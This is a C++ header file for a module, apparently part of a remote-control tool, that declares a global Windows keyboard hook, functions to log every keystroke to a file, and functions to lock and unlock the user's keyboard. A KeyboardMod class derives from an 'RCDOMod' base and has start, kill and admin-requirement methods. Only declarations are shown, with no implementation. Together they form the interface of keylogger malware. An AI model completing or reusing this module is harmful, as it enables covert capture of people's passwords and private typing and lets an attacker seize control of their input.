#ifndef KEYBOARD_H
#define KEYBOARD_H

#include <Windows.h>
#include <ctime>
#include <fstream>
#include <iostream>
#include <map>
#include <mutex>
#include <sstream>
#include <thread>
#include <vector>

#include "RCDOMod.h"
#include "utils.h"

LRESULT __stdcall hookCallback(int, WPARAM, LPARAM);
bool setHook();
bool releaseHook();
void setLogFile();
void logKeystroke(int);
void lockKeyboard();
void releaseKeyboard();

extern std::map<int, std::wstring> mapSpecialKeys;
extern HHOOK ghHook;
extern KBDLLHOOKSTRUCT kbdStruct;
extern std::wofstream logFile;
extern std::mutex logFileMutex;
class KeyboardMod : public RCDOMod {
public:
    int requireAdmin();
    void start();
    void kill();
};

#endif
